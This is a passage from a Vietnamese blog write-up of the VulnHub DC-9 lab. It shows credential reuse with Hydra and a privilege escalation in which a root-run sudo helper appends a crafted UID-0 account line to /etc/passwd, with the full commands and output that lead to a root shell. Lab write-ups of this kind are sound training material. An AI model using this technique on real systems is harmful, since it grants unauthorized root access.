+<p>Hmm… lại có thểm một vài mật khẩu nữa, nối vào cuối file password.txt rồi gọi lại Hydra xem có lấy thêm được account nào trong hệ thống không.<br><img src="/2021/02/03/dc9-vulnhub/9.png"><br>He, có thêm của fredf.<br>Với mấy user tìm được bên trên thì đều không có tên trong danh sách khách mời của sudoers, mỗi fredf là có.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ sudo -l</span><br><span class="line">Matching Defaults entries for fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/test/test</span><br><span class="line">fredf@dc-9:~$ /opt/devstuff/dist/test/test</span><br><span class="line">Usage: python test.py read append</span><br></pre></td></tr></table></figure>
+<p>Phần này tôi bỏ qua SUID, vì tìm rồi và chả có mẹ gì. Tập trung vào <em>&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test</em>. Tìm xem cái file <em>test.py</em> ở đâu và có nội dung gì.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ find / -name &quot;test.py&quot; 2&gt;/dev/null</span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist-packages/setuptools/command/test.py</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ ls -al /opt/devstuff/test.py</span><br><span class="line">-rw-r--r-- 1 root root 257 Feb  5 00:25 /opt/devstuff/test.py</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ cat /opt/devstuff/test.py</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len (sys.argv) != 3 :</span><br><span class="line">    print (&quot;Usage: python test.py read append. Adudu&quot;)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line">else :</span><br><span class="line">    f = open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+<p>File này chỉ có quyền đọc thôi, không có quyền sửa. Nhưng đọc nội dung xem nó làm cái gì.<br>Sau câu lệnh else, nó thực hiện đọc nội dung file <em>sys.argv[1]</em> và nối (appent) vào file <em>sys.argv[2]</em>, với quyền Root. ĐÙ!<br>Thế thì bây giờ tôi sẽ tự tạo một tài khoản bằng cách chèn thêm vào cuối file &#x2F;etc&#x2F;passwd với ID 0, vì trong Linux, user có ID 0 thì mặc định là Root.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ echo minhdeptraivcl:$(openssl passwd 00000):0:0:root:/root:/bin/bash &gt; duma.txt</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ cat duma.txt </span><br><span class="line">minhdeptraivcl:FLvn5eWX/KeFQ:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test duma.txt /etc/passwd</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash</span><br><span class="line">minhdeptraivcl:FLvn5eWX/KeFQ:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">fredf@dc-9:~$ su minhdeptraivcl</span><br><span class="line">Password: 00000</span><br><span class="line"></span><br><span class="line">root@dc-9:/home/fredf# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>Done, Ez!<br>Việc có quyền ghi file với quyền của Root giống như leo thang với các trình editer như Vim hay Nano vậy, có thể sửa đổi những file nhạy cảm như &#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow và một loạt các file cấu hình quan trọng khác trong hệ thống của Linux.</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/03/mrrobot-vulnhub/" rel="prev" title="[VulnHub] Mr.Robot">
+                  <i class="fa fa-angle-left"></i> [VulnHub] Mr.Robot
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/25/flick2-vulnhub/" rel="next" title="[VulnHub] Flick 2">
+                  [VulnHub] Flick 2 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
